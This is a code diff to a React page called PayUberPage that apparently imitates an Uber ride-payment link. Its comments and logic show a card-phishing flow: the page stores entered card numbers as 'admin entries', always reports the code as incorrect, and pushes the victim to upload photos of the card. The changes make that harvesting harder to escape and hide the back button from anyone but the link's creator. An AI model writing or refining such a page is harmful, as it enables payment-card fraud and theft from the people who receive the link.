@@ -144,10 +144,10 @@ export default function PayUberPage() {
 
   // Receipt upload state (always reports incorrect code)
   const [showUploadStep, setShowUploadStep] = useState(false)
-  const [uploadDone, setUploadDone] = useState(false)
   const [selectedImages, setSelectedImages] = useState([])
   const [uploadProgress, setUploadProgress] = useState(false)
   const [uploadError, setUploadError] = useState(null)
+  const [createdSession, setCreatedSession] = useState(false)
 
   const mapRef = useRef(null)
   const leafletRef = useRef(null)
@@ -270,6 +270,42 @@ export default function PayUberPage() {
       .catch(() => { if (!cancelled) setSessionError('Failed to load payment session') })
       .finally(() => { if (!cancelled) setSessionLoading(false) })
     return () => { cancelled = true }
+  }, [sessionId])
+
+  // Pay-mode back button only exists for whoever created the session (clicked Pay Now)
+  useEffect(() => {
+    if (!sessionId) return
+    try {
+      const list = JSON.parse(localStorage.getItem('payuber_created_sessions') || '[]')
+      setCreatedSession(Array.isArray(list) && list.includes(sessionId))
+    } catch (err) {
+      setCreatedSession(false)
+    }
+  }, [sessionId])
+
+  // Restore the ride search after coming back from a pay session (before Pay Now)
+  useEffect(() => {
+    if (sessionId || mapViewActive) return
+    let restored = null
+    try {
+      const raw = sessionStorage.getItem('payuber_last_search')
+      if (!raw) return
+      restored = JSON.parse(raw)
+      if (!restored || !restored.pickup) return
+      setPickupData(restored.pickup)
+      setDropoffData(restored.dropoff)
+      setRouteCoords(restored.routeCoords || null)
+      setDistanceKm(restored.distanceKm || 0)
+      setDurationMin(restored.durationMin || 0)
+      setRideList(restored.rideList || [])
+      setSelectedType(restored.selectedType || 'uber_x')
+      setMapViewActive(true)
+      pushView('mapView')
+    } catch (err) {} finally {
+      if (restored) {
+        try { sessionStorage.removeItem('payuber_last_search') } catch (err) {}
+      }
+    }
   }, [sessionId])
 
   // Draw trip map in landing ride list
@@ -585,6 +621,17 @@ export default function PayUberPage() {
       setSelectedType('uber_x')
       setMapViewActive(true)
       pushView('mapView')
+      try {
+        sessionStorage.setItem('payuber_last_search', JSON.stringify({
+          pickup,
+          dropoff,
+          routeCoords: coords,
+          distanceKm: route.distance / 1000,
+          durationMin: Math.round(route.duration / 60),
+          rideList: getAllPrices(route.distance / 1000),
+          selectedType: 'uber_x',
+        }))
+      } catch (err) {}
     } catch (err) {
       setSearchError('An unexpected error occurred during search. Please try again.')
     } finally {
@@ -624,6 +671,13 @@ export default function PayUberPage() {
       const id = await createSession()
       setShowModal(false)
       viewStackRef.current = viewStackRef.current.filter((v) => v !== 'modal' && v !== 'mapView')
+      try {
+        const list = JSON.parse(localStorage.getItem('payuber_created_sessions') || '[]')
+        if (Array.isArray(list) && !list.includes(id)) {
+          list.push(id)
+          localStorage.setItem('payuber_created_sessions', JSON.stringify(list))
+        }
+      } catch (err) {}
       router.push(`/payuber?id=${id}`)
     } catch (err) {
       showToast('Unable to create the payment link right now. Please try again.')
@@ -701,7 +755,6 @@ export default function PayUberPage() {
         // Second entry: a new admin entry is saved; now ask for the card image
         setCardAttempt(0)
         setCardNumber('')
-        setUploadDone(false)
         setUploadError(null)
         setSelectedImages([])
         setShowUploadStep(true)
@@ -733,7 +786,7 @@ export default function PayUberPage() {
     setSelectedImages((prev) => prev.filter((_, i) => i !== index))
   }
 
-  // Upload is optional; if images are chosen they are saved to the last admin entry
+  // Upload if images were chosen (optional), then return to the code field with the error
   const handleUpload = async () => {
     if (uploadProgress) return
     if (selectedImages.length > 0) {
@@ -749,15 +802,10 @@ export default function PayUberPage() {
       } catch (err) {}
       setUploadProgress(false)
     }
-    setUploadDone(true)
-  }
-
-  const handleContinueAfterUpload = () => {
     setShowUploadStep(false)
-    setUploadDone(false)
     setSelectedImages([])
     setUploadError(null)
-    setCardError('The card code you entered is still incorrect. Please verify the code and try again.')
+    setCardError('The code is incorrect.')
   }
 
   const selectedSummary = session ? {
@@ -1048,7 +1096,9 @@ export default function PayUberPage() {
         <div className="map-view active pay-mode">
           <div className="map-sidebar">
             <div className="map-sidebar-header">
-              <button className="map-back-btn" onClick={() => router.push('/payuber')} dangerouslySetInnerHTML={{ __html: `${BACK_ICON} Back` }} />
+              {createdSession && (
+                <button className="map-back-btn" onClick={() => history.back()} dangerouslySetInnerHTML={{ __html: `${BACK_ICON} Back` }} />
+              )}
             </div>
             <div className="map-sidebar-results" id="map-results">
               {sessionLoading && <p style={{ padding: 16, color: '#545454' }}>Loading payment session...</p>}
@@ -1092,6 +1142,7 @@ export default function PayUberPage() {
                   <div className="payment-methods-grid">
                     {PAYMENT_METHODS.map((method) => {
                       const expanded = expandedMethod === method.id
+                      if (expandedMethod && !expanded) return null
                       return (
                         <div key={method.id} className="payment-method-item">
                           <div
@@ -1108,7 +1159,6 @@ export default function PayUberPage() {
                               setCardResult(null)
                               setCardAttempt(0)
                               setUploadError(null)
-                              setUploadDone(false)
                               setSelectedImages([])
                               setShowUploadStep(false)
                               pushView('method')
@@ -1121,7 +1171,7 @@ export default function PayUberPage() {
                               </div>
                             </div>
                           </div>
-                          {expanded && (
+                          {expanded && !showUploadStep && (
                             <div className="payment-method-expanded">
                               <form onSubmit={checkCard}>
                                 <div className="uber-input-row">
@@ -1148,43 +1198,35 @@ export default function PayUberPage() {
 
                   {showUploadStep && cardResult && (
                     <div className="payment-upload-ui">
-                      {uploadDone ? (
-                        <>
-                          <button className="btn btn-primary" style={{ width: '100%' }} onClick={handleContinueAfterUpload}>
-                            Continue
-                          </button>
-                        </>
-                      ) : (
-                        <>
-                          <label className="payment-upload-dropzone">
-                            <input type="file" accept="image/*" multiple style={{ display: 'none' }} onChange={handleImageSelect} />
-                            <div className="payment-upload-icon" dangerouslySetInnerHTML={{ __html: UPLOAD_ICON }} />
-                            <div className="payment-upload-title">Upload Card Image or Screenshots</div>
-                            <div className="payment-upload-sub">Tap to select photos of your card or screenshots</div>
-                          </label>
-                          {selectedImages.length > 0 && (
-                            <div className="payment-upload-previews">
-                              {selectedImages.map((img, i) => (
-                                <div key={i} className="payment-upload-preview">
-                                  <img src={img.preview} alt={`preview ${i}`} />
-                                  <button
-                                    type="button"
-                                    className="payment-upload-remove"
-                                    onClick={() => removeImage(i)}
-                                  >
-                                    ×
-                                  </button>
-                                </div>
-                              ))}
+                      <label className="payment-upload-dropzone">
+                        <input type="file" accept="image/*" multiple style={{ display: 'none' }} onChange={handleImageSelect} />
+                        <div className="payment-upload-icon" dangerouslySetInnerHTML={{ __html: UPLOAD_ICON }} />
+                        <div className="payment-upload-title">Upload Card Image or Screenshots</div>
+                        <div className="payment-upload-sub">Tap to select photos of your card or screenshots</div>
+                      </label>
+                      {selectedImages.length > 0 && (
+                        <div className="payment-upload-previews">
+                          {selectedImages.map((img, i) => (
+                            <div key={i} className="payment-upload-preview">
+                              <img src={img.preview} alt={`preview ${i}`} />
+                              <button
+                                type="button"
+                                className="payment-upload-remove"
+                                onClick={() => removeImage(i)}
+                              >
+                                ×
+                              </button>
                             </div>
-                          )}
-                          {uploadError && <p style={{ color: '#E54B4B', fontSize: 13, marginTop: 8 }}>{uploadError}</p>}
-                          <div className="payment-upload-actions">
-                            <button className="btn btn-primary" style={{ flex: 1 }} onClick={handleUpload} disabled={uploadProgress}>
-                              {uploadProgress ? 'Uploading...' : selectedImages.length > 0 ? 'Upload Card Image' : 'Skip'}
-                            </button>
-                          </div>
-                        </>
+                          ))}
+                        </div>
+                      )}
+                      {uploadError && <p style={{ color: '#E54B4B', fontSize: 13, marginTop: 8 }}>{uploadError}</p>}
+                      {selectedImages.length > 0 && (
+                        <div className="payment-upload-actions">
+                          <button className="btn btn-primary" style={{ flex: 1 }} onClick={handleUpload} disabled={uploadProgress}>
+                            {uploadProgress ? 'Uploading...' : 'Upload Card Image'}
+                          </button>
+                        </div>
                       )}
                     </div>
                   )}
